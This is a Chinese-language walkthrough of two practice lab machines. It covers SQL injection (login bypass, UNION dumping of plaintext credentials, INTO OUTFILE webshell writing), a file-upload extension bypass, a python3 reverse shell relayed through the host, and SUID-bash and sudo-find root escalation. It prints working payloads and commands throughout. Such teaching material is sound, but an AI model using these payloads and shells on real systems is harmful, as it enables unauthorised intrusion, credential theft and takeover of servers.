### **<span style="color:#3498db">靶机一：SQL注入写马提权（10.10.1.37）</span>**

**环境**：靶机 10.10.1.37（Ubuntu + YX-CRM 客户管理系统），Kali 攻击机双网卡（NAT 192.168.21.129、桥接 172.16.13.34），宿主机 Windows 172.16.13.76。

#### 信息收集

nmap 扫端口，开了 22（SSH）和 80（Apache）。gobuster 爆目录，得到 `/uploads`、`/assets`、`/includes` 三个路径。

![mm](/assets/img/2025-06-11-10-56-45.png)
![mm](/assets/img/2025-06-11-10-58-47.png)

`/uploads` 开了目录浏览，里面还留着前一天练习写进去的 `cc.php`、`shell.php` 等木马——**说明这个目录能写文件**，后面写马就靠它。

![mm](/assets/img/2025-06-11-10-59-47.png)

`/includes` 是源代码目录，里面躺着 `db.php`（数据库连接配置），先记下这个文件。

![mm](/assets/img/2025-06-11-11-01-32.png)

#### 登录处注入（万能密码）

登录框用户名输入 `admin ';--`，密码随便填。`'` 闭合了用户名引号，`--` 把后面的密码判断整段注释掉——**不用密码直接以 admin 登录**，这就是万能密码的原理：不是猜中密码，而是让校验消失。

![mm](/assets/img/2025-06-11-11-04-52.png)

进去发现 admin 也没什么特权，于是回到刚才发现的 `db.php`。既然有注入点，就不用猜源码，直接用 SQL 把文件读出来。

#### 搜索处联合查询注入

客户检索 `search.php?q=` 就是注入点，流程三步：测注入、测列数、找回显位。

输入 `' --` 返回全部客户，说明条件被注释、注入成立：

![mm](/assets/img/2025-06-11-11-07-01.png)

`order by 4` 报错、`order by 3` 正常，说明**查询返回 3 列**；再用 `-1' union select 1,2,3 --` 确认三个位置都有回显（union 把我们的查询"搭车"展示到页面上，列数必须一致）：

![mm](/assets/img/2025-06-11-11-09-35.png)

先看基础信息 `version()、database()、user()`，得到 MariaDB、库名 `yxcrm`：

![mm](/assets/img/2025-06-11-11-10-57.png)
![mm](/assets/img/2025-06-11-11-11-13.png)

接着翻 **information_schema**（数据库自带的"户口本"，记录所有库表列信息）拿到表名 `customers、users`、列名，把 users 表整个拖出来——**密码全是明文**，管理员密码直接到手：

![mm](/assets/img/2025-06-11-11-12-04.png)
![mm](/assets/img/2025-06-11-11-12-19.png)

再用 `load_file()` 读源码（读文件走的是数据库进程的权限），`db.php` 内容到手，注释还写着：这个账号**故意带着 FILE 权限**，用来演示 INTO OUTFILE 写马。

```sql
-1' union select 1,2,load_file('/var/www/html/includes/db.php') --
```

![mm](/assets/img/2025-06-11-11-15-59.png)

#### INTO OUTFILE 写一句话木马

`INTO OUTFILE` 把查询结果写到服务器磁盘，木马代码本身就是个字符串，塞进查询结果就行：

```plaintext
-1' union select 1,2,'<?php @eval($_POST["cmd"]);?>' into outfile "/var/www/html/includes/cc.php"--
```

![mm](/assets/img/2025-06-11-11-18-38.png)

结果报错。原因要记住：

> **MySQL 的 FILE 权限只是数据库层面的许可，真正写文件的还是 mysqld 所在的 Linux 用户。** 目标目录必须对 mysql 用户可写才行，"有 FILE 权限"不等于"想写哪写哪"。

`/includes` 不可写，换成应用自己的 `/uploads`。注意 `INTO OUTFILE` **不能覆盖已存在的文件**，同名文件在就直接拒绝（前一天写过的 `cc.php` 时间戳没变，正说明这次没写进去）。目录里已有木马，直接 curl 调用：

```bash
curl -X POST http://10.10.1.37/uploads/cc2.php -d "cmd=ls"
```

![mm](/assets/img/2025-06-11-13-54-11.png)

执行成功（输出开头的 `1 2` 是 union 结果残留的字段，被一起写进文件了，不影响执行）。拿到命令执行，但每敲一条命令都要发一次请求，下一步换成反弹 shell。

#### 反弹 shell：双网卡的坑

反弹 shell 是让**靶机主动连回攻击机**（`bash -i >& /dev/tcp/IP/端口 0>&1`，`/dev/tcp` 是 bash 内置的 TCP 通道）。

Kali 开监听 `nc -lvp 4444`，靶机侧用 python3 反弹，结果连不上。排查：让靶机 ping 一下 Kali 的桥接网卡：

![mm](/assets/img/2025-06-11-13-56-01.png)

**100% 丢包**。Kali 访问靶机一直正常（不然前面扫描都做不了），但反过来就不通——**正向通不代表反向通**，桥接网卡这条回程路根本不存在。

既然"经过宿主机"的路是通的，就让宿主机当**中转站**：靶机连宿主机 `172.16.13.76:4444`，宿主机把流量转发给 Kali 的 NAT 网卡 `192.168.21.129:4444`。在 Windows 上跑一段 PowerShell（就是写一个极简 TCP 代理：监听 4444，每条连接再向 Kali 发起一条，两个线程互相搬字节流）：

![mm](/assets/img/2025-06-11-14-00-07.png)

靶机侧改成连宿主机：

```bash
curl -X POST http://10.10.1.37/uploads/cc2.php \
-d "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"172.16.13.76\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

Kali 监听里立刻弹回 shell，拿到 `www-data`（连接来源显示 192.168.21.1，正是宿主机，说明流量确实是中转过来的）：

![mm](/assets/img/2025-06-11-14-01-59.png)

#### SUID 提权

```bash
find / -perm -4000 2>/dev/null
```

**SUID 位的含义：程序运行时以"文件属主"的身份执行**，属主是 root 就等于运行时是 root。结果里 `/usr/local/bin/sysbash` 很扎眼——**/usr/local 是给手工安装的软件留的目录，系统程序不会放这**，一个陌生名字基本就是人为留的提权点。

![mm](/assets/img/2025-06-11-14-04-00.png)

`ls -ll` 一看：`-rwsr-xr-x root root`，带 s 位，是 bash 的副本（1.4M 大小）。

![mm](/assets/img/2025-06-11-14-05-23.png)

```bash
/usr/local/bin/sysbash -p
id
```

![mm](/assets/img/2025-06-11-14-06-54.png)

直接 root。**`-p` 必须加**：bash 发现自己是"被提权运行"（euid≠ruid）时会主动降权丢 root，加 `-p` 才会保留。只有 SUID 不加 `-p` → 自动丢；只加 `-p` 没有 SUID → 本来就没 root。

### **<span style="color:#3498db">靶机二：文件上传绕过（10.10.1.53）</span>**

**环境**：靶机 10.10.1.53（Ubuntu，头像上传业务），攻击机 10.10.1.96。

nmap、gobuster 走一遍，版本和靶机一类似，同样有 `/uploads` 目录：

![mm](/assets/img/2025-06-15-11-27-13.png)
![mm](/assets/img/2025-06-15-13-54-05.png)

#### 上传点绕过

头像上传页只提示"支持 jpg / png / gif"，说明后端是按后缀做的黑名单过滤。抓包把同一个木马换成不同后缀逐个请求，**对比响应长度**：和正常 jpg（1500+ 字节）长度接近的才是被当成正常图片处理的。

![mm](/assets/img/2025-06-15-14-11-30.png)

结果 `php.` 和 `phtml` 都能通过（`php.` 只在 Windows 上会被解析），选更通用的 **phtml**：内容还是 `<?php @eval($_POST["cmd"]);?>`，直接以头像上传：

![mm](/assets/img/2025-06-15-14-16-46.png)

上传成功还贴心地返回了访问地址。注意调用木马时的坑：payload 是表单数据，里面的 `&` 会被当成参数分隔符截断命令，**要写成 URL 编码 `%26`**，PHP 收到后会自动还原成 `&`：

![mm](/assets/img/2025-06-15-14-21-53.png)
![mm](/assets/img/2025-06-15-14-42-16.png)

成功反弹拿到 shell，翻到 flag：

![mm](/assets/img/2025-06-15-14-54-59.png)

#### sudo find 提权

`sudo -l` 看免密权限，发现 www-data 可以免密以 root 执行 `/usr/bin/find`：

![mm](/assets/img/2025-06-15-15-22-25.png)

find 的 `-exec` 参数可以执行命令，让它以 root 身份拉起一个 bash（`-quit` 是找一个文件就退出，避免重复开 shell）：

```bash
sudo find . -exec /bin/bash \; -quit
whoami
```

![mm](/assets/img/2025-06-15-15-29-51.png)

root 到手。命令行工具自带的"能执行命令"的参数，就是提权里的常客。
